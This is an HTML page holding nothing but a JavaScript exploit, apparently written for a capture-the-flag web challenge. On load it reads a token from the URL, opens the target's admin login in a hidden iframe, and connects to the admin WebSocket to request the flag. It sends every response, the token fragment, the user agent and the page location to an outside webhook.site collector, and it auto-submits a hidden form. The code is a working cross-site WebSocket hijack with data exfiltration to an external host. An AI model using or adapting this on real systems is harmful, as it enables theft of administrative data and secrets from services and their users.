<!doctype html>
<html>
<body>
<script>
const REC = "https://webhook.site/0f10c98d-9181-4a92-b57a-1eae97ed5a47/x=?";

function report(msg){
  try {
    fetch(REC + encodeURIComponent(msg)).catch(e=>{
      try { new Image().src = REC + encodeURIComponent("REPORT_FAIL: " + e); } catch {}
    });
  } catch(e){}
}


function exploit() {
  report("START_EXPLOIT");

  const iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  
  const urlParams = new URLSearchParams(window.location.search);
  const token = urlParams.get('token') || urlParams.get('admin') || urlParams.get('key');
  
  iframe.onload = function() {
    report("IFRAME_LOADED");
    setTimeout(() => {
      connectWebSocket();
    }, 2000);
  };
  

  const baseUrl = "https://65.109.185.79:8080";
  

  if (token) {
    report("TOKEN_FOUND: " + token.substring(0, 10) + "...");
    iframe.src = `${baseUrl}/admin/login?token=${token}`;
  } 

  else {
    iframe.src = `${baseUrl}/admin/login?token=INVALID`;
  }
  
  document.body.appendChild(iframe);
}

function connectWebSocket() {
  const ws_url = "ws://web:8080/admin/ws";
  report("TRY_WS_FROM_IFRAME:" + ws_url);
  
  try {
    let ws = new WebSocket(ws_url);
    let received = "";
    let done = false;
    
    ws.onopen = () => {
      report("WS_OPEN_ADMIN");
      try {
        ws.send("flag");
        report("WS_SENT_FLAG");
      } catch(e) {
        report("WS_SEND_ERR:" + e);
      }
    };
    
    ws.onmessage = (m) => {
      received += m.data + "\n";
      report("WS_ADMIN_RECV:" + m.data);
      done = true;
      try { ws.close(); } catch(e){}
    };
    
    ws.onerror = (ev) => {
      report("WS_ADMIN_ERROR:" + String(ev));
    };
    
    setTimeout(() => {
      if(!done) {
        try{ ws.close(); } catch(e){}
        report("WS_ADMIN_TIMEOUT");
        tryFallback();
      }
    }, 5000);
  } catch(e) {
    report("WS_CONNECT_EXCEPTION:" + e);
  }
}

function tryFallback() {
  const ws_url = "ws://web:8080/ws";
  report("TRY_NON_ADMIN_WS:" + ws_url);
  
  try {
    let ws = new WebSocket(ws_url);
    
    ws.onopen = () => {
      report("NON_ADMIN_WS_OPEN");
    };
    
    ws.onmessage = (m) => {
      report("NON_ADMIN_COUNTER:" + m.data);
      ws.close();
    };
    
    setTimeout(() => ws.close(), 3000);
  } catch(e) {
    report("FALLBACK_WS_ERROR:" + e);
  }
}

function tryFormBased() {
  report("TRYING_FORM_BASED");

  const form = document.createElement('form');
  form.method = 'POST';
  form.action = 'http://web:8080/submit';
  form.target = '_blank';

  const urlInput = document.createElement('input');
  urlInput.type = 'hidden';
  urlInput.name = 'url';
  urlInput.value = window.location.href + '?token_capture=true';
  
  form.appendChild(urlInput);
  document.body.appendChild(form);
  form.submit();
}

// Execute
report("USER_AGENT: " + navigator.userAgent);
report("LOCATION: " + window.location.href);


setTimeout(exploit, 5000);
setTimeout(tryFormBased, 5000);
</script>
</body>
</html>
